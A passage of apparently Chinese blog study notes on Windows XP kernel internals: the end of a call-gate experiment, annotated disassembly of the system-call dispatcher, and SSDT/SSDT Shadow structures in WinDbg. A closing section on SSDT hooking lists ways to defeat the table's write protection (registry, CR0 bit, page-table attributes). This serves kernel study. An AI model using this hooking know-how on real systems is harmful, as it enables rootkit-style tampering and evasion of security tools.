class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//jmp fword ptr[buff]</span></span><br><span class="line">		<span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok: %d\nESP: %x\nCS: %x\n&quot;</span>, dwOk, dwESP, dwCS);</span><br><span class="line">	system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>在VC6中执行代码。</p>
</li>
<li><p>根据TSS任务段的地址在GDT表中构造TSS任务段描述符，然后获取CR3的值。（<code>!process 0 0</code>）</p>
<p><img data-src="https://s2.loli.net/2021/12/24/GfMEVXwo3YjxIka.png" alt="91.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/24/f6XcAY3LS58Jqly.png" alt="92.png"></p>
</li>
<li><p>回到XP的VC6中输入CR3的值06e40300后F5继续执行。</p>
<p><img data-src="https://s2.loli.net/2021/12/24/oyWE4AZ8aUYwxOB.png" alt="93.png"></p>
</li>
</ol>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 系统调用（二）</title>
    <url>/post/WinXP-SystemCall2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-系统服务调用"><a href="#1-系统服务调用" class="headerlink" title="1 系统服务调用"></a>1 系统服务调用</h2><p>上一篇分析了2种方式从3环进0环，进入0环后分别调用2个0环的函数：KiSystemService（int 0x2e）、KiFastCallEntry（sysenter），这两个函数经过一波初始化任务之后都转到相同的地址去就执行代码。以下4个问题中的1已经在上一篇解决了（保留到_Trap_Frame结构体中），接下来将会继续分析问题2和3，问题4要等到学习APC之后才能解决。</p>
<ol>
<li>进0环后，原来的寄存器存在哪里？</li>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
<li>2种调用方式是如何返回到3环的？</li>
</ol>
<h3 id="1-1-SystemServiceTable（SST）"><a href="#1-1-SystemServiceTable（SST）" class="headerlink" title="1.1 SystemServiceTable（SST）"></a>1.1 SystemServiceTable（SST）</h3><div class="note warning"><p><mark class="label danger">注意：</mark><strong>SystemServiceTable 系统服务表不是SSDT。</strong></p>
<p>SystemServiceTable：<strong>SST</strong>，系统服务表。<br>System Services Descriptor Table：<strong>SSDT</strong>，系统服务描述符表，导出结构为KeServiceDescriptorTable（在内核ntoskrnl.exe导出表中可看到该<strong>全局变量</strong>）。<br>SystemServiceParameterTable：<strong>SSPT</strong>，系统服务参数表。</p>
<p>System Services Descriptor Table Shadow：<strong>SSDT Shadow</strong>，系统服务描述符表Shadow，导出结构为KeServiceDescriptorTableShadow，该结构没有导出。</p>
</div>



<p><img data-src="https://s2.loli.net/2022/03/02/42VKOw67PTjZhXD.png" alt="19.png"></p>
<div class="note primary"><p>通过上图，我们可以得知以下信息：</p>
<ul>
<li>通过<code>_KTHREAD</code>偏移<code>0xE0</code>可以找到系统服务表SSDT。</li>
<li>系统服务表又指向了函数地址表和函数参数表（SSPT）</li>
<li>有两张系统服务表，第一张是用来找内核函数的，第二张是找<code>Win32k.sys</code>驱动函数的。</li>
<li><strong>两张系统服务表是线性地址连续的，每张16字节</strong>。</li>
<li>SST表成员：<ul>
<li>ServiceTable，是一个指针，指向函数地址表（每个成员4Byte）。</li>
<li>Count没有用。</li>
<li>ServiceLimit，当前系统服务表函数的个数。</li>
<li>ArgmentTable，指向函数参数表，参数表每个成员大小为1字节，值为参数的大小，函数参数个数（<strong>存储值 &#x2F; 4 &#x3D; 参数个数</strong>），每个成员和函数地址表中的函数一一对应。</li>
</ul>
</li>
</ul>
</div>

<p>3环API进0环之前，无论是中断门还是快速调用，都会在 eax 里存一个值，我们称之为<strong>系统调用号或者服务号</strong>。EAX系统服务号：</p>
<ul>
<li>1～12位：函数地址表&#x2F;函数参数表索引（下标）。</li>
<li><mark class="label danger">第13位（下标12）</mark>：
<ul>
<li><strong>0</strong>，表示找第一张系统服务表（绿色的表）；</li>
<li><strong>1</strong>，那么找第二张表（黄色的表）。</li>
</ul>
</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/03/02/uQpa9owirSz8sMJ.png" alt="20.png"></p>
<p>SST结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-继续分析函数"><a href="#1-2-继续分析函数" class="headerlink" title="1.2 继续分析函数"></a>1.2 继续分析函数</h3><p>前篇博客，逆向分析了 KiSystemService 和 KiFastCallEntry 填充_KTRAP_FRAME 结构体的代码，二者大同小异，主要的区别是 sysenter 只改了eip,cs,ss，虽然esp也改了，但是windows不使用，而是从TSS里取esp0；另外sysenter并没有像中断门那样压栈，所以3环的 ss, esp, eflags, cs,eip都要在函数里依次保存到 _KTRAP_FRAME 。</p>
<p>他们两个函数开头的初始化工作不一样，有两个入口，初始化的工作有区别，但是往后就共用一个函数体。以下继续分析：</p>
<ul>
<li>如何根据系统服务号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0046</span>A5AF</span><br><span class="line">.text:<span class="number">0046</span>A5AF loc_46A5AF:                             ; CODE XREF: _KiBBTUnexpectedRange+<span class="number">18</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         ; _KiSystemService+<span class="number">72</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A5AF                 mov     edi, eax		<span class="comment">//edi = eax = 系统调用号</span></span><br><span class="line">.text:<span class="number">0046</span>A5B1                 shr     edi, <span class="number">8</span>		<span class="comment">//系统服务号右移8位</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                 <span class="keyword">and</span>     edi, <span class="number">30</span>h		<span class="comment">//edi = 取系统服务号第13、14位来与运算</span></span><br><span class="line">  							<span class="comment">//000X xxxx &amp; 0011 0000 = 000X 0000 = 0xX0 = 0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B7                 mov     ecx, edi		<span class="comment">//ecx = edi = 0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B9                 add     edi, [esi+<span class="number">0E0</span>h]	<span class="comment">//esi = _KTHREAD，esi+0E0h指向SSDT，edi = SST</span></span><br><span class="line">  							<span class="comment">//系统服务表有ServiceTable,Count,ServiceLimit和ArgmentTable四个成员，</span></span><br><span class="line">  							<span class="comment">//4项共0x10字节，所以通过这里的代码也可以推断，内核和win32k.sys的系统服务表是</span></span><br><span class="line">  							<span class="comment">//连续的。第一张是ntoskrnl.exe导出，第二张是win32k.sys导出的</span></span><br><span class="line">.text:<span class="number">0046</span>A5BF                 mov     ebx, eax		<span class="comment">//ebx = eax = 系统调用号</span></span><br><span class="line">.text:<span class="number">0046</span>A5C1                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFh	<span class="comment">//取系统调用号低12位做偏移</span></span><br><span class="line">.text:<span class="number">0046</span>A5C6                 cmp     eax, [edi+<span class="number">8</span>]	<span class="comment">//系统调用号 - SST.ServiceLimit，判断函数是否在表的范围内</span></span><br><span class="line">.text:<span class="number">0046</span>A5C9                 jnb     _KiBBTUnexpectedRange<span class="comment">//系统调用号 &gt;= SST.ServiceLimit，不在表里，跳转异常处理</span></span><br><span class="line">.text:<span class="number">0046</span>A5CF                 cmp     ecx, <span class="number">10</span>h		<span class="comment">//判断系统服务号的函数是ntoskrnl.exe/win32k.sys导出</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                 jnz     <span class="keyword">short</span> loc_46A5EF	<span class="comment">//判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5D4                 mov     ecx, large fs:<span class="number">18</span>h<span class="comment">//ecx指向_NT_TIB</span></span><br><span class="line">.text:<span class="number">0046</span>A5DB                 <span class="keyword">xor</span>     ebx, ebx		<span class="comment">//ebx = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A5DD</span><br><span class="line">.text:<span class="number">0046</span>A5DD loc_46A5DD:                             ; DATA XREF: _KiTrap0E+<span class="number">117</span>↓o</span><br><span class="line">.text:<span class="number">0046</span>A5DD                 <span class="keyword">or</span>      ebx, [ecx+<span class="number">0F</span>70h]</span><br><span class="line">.text:<span class="number">0046</span>A5E3                 jz      <span class="keyword">short</span> loc_46A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5E5                 push    edx</span><br><span class="line">.text:<span class="number">0046</span>A5E6                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A5E7                 call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:<span class="number">0046</span>A5ED                 pop     eax</span><br><span class="line">.text:<span class="number">0046</span>A5EE                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5EF loc_46A5EF:                             ; CODE XREF: _KiFastCallEntry+B2↑j</span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         ; _KiFastCallEntry+C3↑j</span><br><span class="line">.text:<span class="number">0046</span>A5EF                 inc     large dword ptr fs:<span class="number">638</span>h	<span class="comment">//0FFDFF638h = fs[0]+_KPRCB+518 = KeSystemCalls</span></span><br><span class="line">  								<span class="comment">//_KPCR.KPRCB.KeSystemCalls += 1, 系统调用计数加1</span></span><br><span class="line">.text:<span class="number">0046</span>A5F6                 mov     esi, edx		<span class="comment">//esi指向3环API第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5F8                 mov     ebx, [edi+<span class="number">0</span>Ch]	<span class="comment">//ebx = SST.ArgmentTable</span></span><br><span class="line">.text:<span class="number">0046</span>A5FB                 <span class="keyword">xor</span>     ecx, ecx		<span class="comment">//ecx = 0</span></span><br><span class="line">.text:<span class="number">0046</span>A5FD                 mov     cl, [eax+ebx]	<span class="comment">//ecx = SST.ArgmentTable + 系统调用号低12位*1，即ecx = 函数参数大小</span></span><br><span class="line">.text:<span class="number">0046</span>A600                 mov     edi, [edi]	<span class="comment">//edi = SST.ServiceTable = KeServiceDescriptorTable</span></span><br><span class="line">.text:<span class="number">0046</span>A602                 mov     ebx, [edi+eax*<span class="number">4</span>]	<span class="comment">//ebx = SST.ServiceTable + 系统调用号低12位*4 = 函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A605                 sub     esp, ecx		<span class="comment">//0环抬高栈顶，马上将3环参数复制到0环</span></span><br><span class="line">.text:<span class="number">0046</span>A607                 shr     ecx, <span class="number">2</span>		<span class="comment">//ecx = 参数个数 = 参数大小/4</span></span><br><span class="line">.text:<span class="number">0046</span>A60A                 mov     edi, esp		<span class="comment">//edi指向0环栈顶</span></span><br><span class="line">.text:<span class="number">0046</span>A60C                 cmp     esi, ds:_MmUserProbeAddress<span class="comment">//越界检查，如果 esi（3环参数指针）大于等于</span></span><br><span class="line">.text:<span class="number">0046</span>A612                 jnb     loc_46A7C0	<span class="comment">//用户空间0x7fff0000，则返回 c0000005 异常</span></span><br><span class="line">.text:<span class="number">0046</span>A618</span><br><span class="line">.text:<span class="number">0046</span>A618 loc_46A618:                             ; CODE XREF: _KiFastCallEntry+<span class="number">2</span>A4↓j</span><br><span class="line">.text:<span class="number">0046</span>A618                                         ; DATA XREF: _KiTrap0E+<span class="number">10</span>D↓o</span><br><span class="line">.text:<span class="number">0046</span>A618                 rep movsd		<span class="comment">//复制参数：复制 esi 到 edi，每次复制4字节，次数由 ecx 决定</span></span><br><span class="line">  							<span class="comment">//方向由DF决定，DF=0，故每次复制后，edi 和 esi 都加4</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                 call    ebx		<span class="comment">//调用内核函数，ebx = 函数地址，返回值存储在eax中</span></span><br><span class="line">.text:<span class="number">0046</span>A61C</span><br><span class="line">.text:<span class="number">0046</span>A61C loc_46A61C:                             ; CODE XREF: _KiFastCallEntry+<span class="number">2</span>AF↓j</span><br><span class="line">.text:<span class="number">0046</span>A61C                                         ; DATA XREF: _KiTrap0E+<span class="number">12</span>D↓o ...</span><br><span class="line">.text:<span class="number">0046</span>A61C                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">0046</span>A61E</span><br><span class="line">.text:<span class="number">0046</span>A61E loc_46A61E:                             ; CODE XREF: _KiBBTUnexpectedRange+<span class="number">38</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A61E                                         ; _KiBBTUnexpectedRange+<span class="number">43</span>↑j</span><br><span class="line">.text:<span class="number">0046</span>A61E                 mov     ecx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+<span class="number">3</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+<span class="number">134</span>h], edx</span><br><span class="line">.text:<span class="number">0046</span>A628 _KiFastCallEntry endp</span><br><span class="line">.text:<span class="number">0046</span>A628</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E ; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure>



<h2 id="2-SSDT"><a href="#2-SSDT" class="headerlink" title="2 SSDT"></a>2 SSDT</h2><p>SSDT（System Services Descriptor Table）系统服务描述符表，内核模块ntoskrnl.exe导出的一个全局变量KeServiceDescriptorTable，用来指向SSDT。</p>
<p>SSDT结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE ntoskrnl;    <span class="comment">// 内核函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE win32k;      <span class="comment">// win32k.sys 函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed1;     <span class="comment">// 未使用</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed2;     <span class="comment">// 未使用</span></span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR, SSDT;</span><br></pre></td></tr></table></figure>

<h3 id="2-1-SST和SSDT"><a href="#2-1-SST和SSDT" class="headerlink" title="2.1 SST和SSDT"></a>2.1 SST和SSDT</h3><p>SST和SSDT的关系如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SSDT</span><br><span class="line">&#123;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">  SST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SST结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br></pre></td></tr></table></figure>

<p>通过前面1.2的分析，要找到SST表可以通过<code>_KTHREAD + 0xE0</code>指向的地址找到，Windows系统在内核模块中导出了一个全局变量KeServiceDescriptorTable（SSDT），也可以得到SST表。</p>
<p><img data-src="https://s2.loli.net/2022/02/19/TdAGBr9ma7QPqtW.png" alt="15.png"></p>
<p>通过<code>_KTHREAD + 0xE0</code>查找SST：</p>
<ol>
<li><p><code>fs[0] = _KPCR = 0xffdff000</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u _KPCR ffdff000</span><br><span class="line">Couldn&#x27;t resolve error at &#x27;_KPCR ffdff000&#x27;</span><br><span class="line">kd&gt; dt _KPCR ffdff000</span><br><span class="line">nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : <span class="number">0xffdff000</span> _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : <span class="number">0xffdff120</span> _KPRCB</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到<code>_KPRCB = 0xffdff120</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+<span class="number">0x000</span> MinorVersion     : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : <span class="number">0x8055ce60</span> _KTHREAD</span><br><span class="line">   +<span class="number">0x008</span> NextThread       : (null) </span><br><span class="line">   +<span class="number">0x00c</span> IdleThread       : <span class="number">0x8055ce60</span> _KTHREAD</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到<code>_KTHREAD = 0x8055ce60</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD <span class="number">0x8055ce60</span></span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> MutantListHead   : _LIST_ENTRY [ <span class="number">0x8055ce70</span> - <span class="number">0x8055ce70</span> ]</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x0e0</span> ServiceTable     : <span class="number">0x8055d700</span> Void</span><br><span class="line">   +<span class="number">0x0e4</span> Queue            : (null) </span><br><span class="line">   +<span class="number">0x0e8</span> ApcQueueLock     : <span class="number">0</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>以看到<code>0x8055d700</code>指向SSDT。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x8055d700</span></span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看内核模块导出的结构<code>KeServiceDescriptorTable</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br></pre></td></tr></table></figure></li>
</ol>
<div class="note danger"><p>可以得到结论：</p>
<ol>
<li>通过<code>_KTHREAD + 0xE0</code>查找得到表是SSDT，通过ntkrnlpa.exe（2-9-9-12）导出结构<code>KeServiceDescriptorTable</code>得到的也是SSDT。</li>
<li><strong>SSDT中过包涵4个SST</strong>，但是仅可以看到第一个（由ntkrnlpa.exe导出的全局变量），想要看到<code>win32k.sys</code>导出的函数还需要分析系统未导出的结构SSDT Shadow。</li>
</ol>
</div>

<p>关于SSDT更多细节可参读：</p>
<ul>
<li><a href="https://www.cnblogs.com/wf751620780/p/10460863.html">SSDT(系统服务描述符表 system services descriptor table)</a></li>
<li><a href="https://www.cnblogs.com/BoyXiao/archive/2011/09/03/2164574.html">进程隐藏与进程保护（SSDT Hook 实现）（一）</a></li>
</ul>
<h3 id="2-2-SSDT和SSDT-Shadow"><a href="#2-2-SSDT和SSDT-Shadow" class="headerlink" title="2.2 SSDT和SSDT Shadow"></a>2.2 SSDT和SSDT Shadow</h3><ul>
<li><strong>SSDT</strong>：KeServiceDescriptorTable，是由ntkrnlpa.exe导出的全局变量，可以在代码中（仅0环）使用。</li>
<li><strong>SSDT Shadow：</strong>KeServiceDescriptorTableShadow，不是导出结构，不可以在0环代码中使用。</li>
</ul>
<p>查看SSDT和SSDT Shadow：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d710  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d720  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d730  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d740  <span class="number">00000002</span> <span class="number">00002710</span> bf80c0b6 <span class="number">00000000</span></span><br><span class="line">  </span><br><span class="line">kd&gt; dd KeServiceDescriptorTableShadow</span><br><span class="line"><span class="number">8055</span>d6c0  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br><span class="line"><span class="number">8055</span>d6d0  bf999b80 <span class="number">00000000</span> <span class="number">0000029b</span> bf99a890</span><br><span class="line"><span class="number">8055</span>d6e0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d6f0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8055</span>d700  <span class="number">80505450</span> <span class="number">00000000</span> <span class="number">0000011</span>c <span class="number">805058</span>c4</span><br></pre></td></tr></table></figure>

<div class="note default"><ol>
<li>SSDT、SSDT Shadow都包含4个SST，但从SSDT中仅可看到由ntkrnlpa.exe导出函数的地址表。</li>
<li>SSDT Shadow可以看到2个地址表，由ntkrnlpa.exe和win32k.sys导出。</li>
</ol>
</div>

<p>在驱动程序中使用SSDT：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//extern &quot;C&quot; __declspec(dllimport)  SSDT  KeServiceDescriptorTable;</span></span><br><span class="line"><span class="keyword">extern</span> SSDT  KeServiceDescriptorTable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_SERVICE_TABLE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  PULONG ServiceTableBase;       <span class="comment">// 函数地址表基址</span></span><br><span class="line">  PULONG ServiceCounterTableBase;<span class="comment">// 函数被调用的次数</span></span><br><span class="line">  ULONG NumberOfService;         <span class="comment">// 函数个数</span></span><br><span class="line">  PULONG ParamTableBase;         <span class="comment">// 函数参数表基址</span></span><br><span class="line">&#125; KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE,SST;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSERVICE_TABLE_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE ntoskrnl;    <span class="comment">// 内核函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE win32k;      <span class="comment">// win32k.sys 函数</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed1;     <span class="comment">// 未使用</span></span><br><span class="line">  KSYSTEM_SERVICE_TABLE unUsed2;     <span class="comment">// 未使用</span></span><br><span class="line">&#125; KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR, SSDT;</span><br></pre></td></tr></table></figure>

<p>  内核中有两个系统服务描述符表,一个是KeServiceDescriptorTable(由ntoskrnl.exe导出)，一个是KeServieDescriptorTableShadow(没有导出)。<br>    两者的区别是：KeServiceDescriptorTable仅有ntoskrnel一项，KeServieDescriptorTableShadow包含了ntoskrnel以及win32k。一般的Native API的服务地址由KeServiceDescriptorTable分派，gdi.dll&#x2F;user.dll的内核API调用服务地址由KeServieDescriptorTableShadow分派。还有要清楚一点的是win32k.sys只有在GUI线程中才加载，一般情况下是不加载的，所以要Hook KeServieDescriptorTableShadow的话，<strong>一般是用一个GUI程序通过IoControlCode来触发</strong>（或者在程序中先调用一个<code>gdi.dll/user.dll</code>的API，否则会蓝屏）。</p>
<div class="note info"><p>32位系统：</p>
<ul>
<li>XP：<code>KeServiceDescriptorTableShadow = KeServiceDescriptorTable - 0×40</code>。</li>
<li>Win7：<code>KeServiceDescriptorTableShadow = KeServiceDescriptorTable + 0×40</code>。</li>
</ul>
<p>64位系统：SSDT表是加密的。</p>
</div>

<p>64位系统的SSDT表可参考：<a href="https://www.cnblogs.com/revercc/p/14701592.html">HOOK技术之SSDT hook（x86&#x2F;x64）</a>。</p>
<h2 id="3-SSDT-HOOK"><a href="#3-SSDT-HOOK" class="headerlink" title="3 SSDT HOOK"></a>3 SSDT HOOK</h2><h3 id="3-1-SSDT-HOOK-原理"><a href="#3-1-SSDT-HOOK-原理" class="headerlink" title="3.1 SSDT HOOK 原理"></a>3.1 SSDT HOOK 原理</h3><p><strong>SSDT HOOK原理</strong>：用自己写好的一个函数替换SSDT中的一个函数<code>SSDT.ntoskrnl.ServiceTableBase[0xIndex]</code>即可。</p>
<div class="note warning"><p>注意事项：</p>
<ol>
<li><p>替换函数地址时必须保证SSDT表是<mark class="label danger">可写入的</mark>，但自XP系统之后SSDT内存块属性仅可读，需要自己进行修改，有至少三种方法可使用：</p>
<ul>
<li><p><mark class="label default">更改注册表</mark><br>恢复页面保护：<code>HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\EnforceWriteProtection=0</code><br>去掉页面保护：<code>HKLM\SYSTEM\CurrentControlset\Control\Session Manger\Memory Management\DisablePagingExecutive=1</code></p>
</li>
<li><p><mark class="label success">改变CR0寄存器下标16的位（第17位 &#x3D;&#x3D; 0，可写）</mark></p>
<p>CR0寄存器的第17位叫做保护属性位，控制着页的读或写属性。该方法在多核情况下不稳定，核切换时CR0也就切换了。</p>
<p><img data-src="https://s2.loli.net/2022/01/09/QMc5JnSfsUotb3B.png" alt="51.png"></p>
</li>
<li><p><mark class="label warning">页表基址修改页属性</mark></p>
<p>通过修改要替换地址的<code>PDE_R/W &amp; PTE_R/W</code>属性。该方法最稳定最好。</p>
</li>
</ul>
</li>
</ol>
</div>

<div class="note primary"><p>32位系统上SSDT是导出的（<code>KeServiceDescriptorTable</code>），<strong>64位是不会导出的</strong>，但是可以通过PCHunter、Kernel Detective等工具查看到内核函数对应的函数下标索引。</p>
</div>

<p>如下是通过PCHunter查看到的SSDT表（内核钩子-SSDT-右键取消仅显示挂钩函数）：</p>
<p><img data-src="https://s2.loli.net/2022/03/07/PoLRjcEU2tr1Ym3.png" alt="21.png"></p>
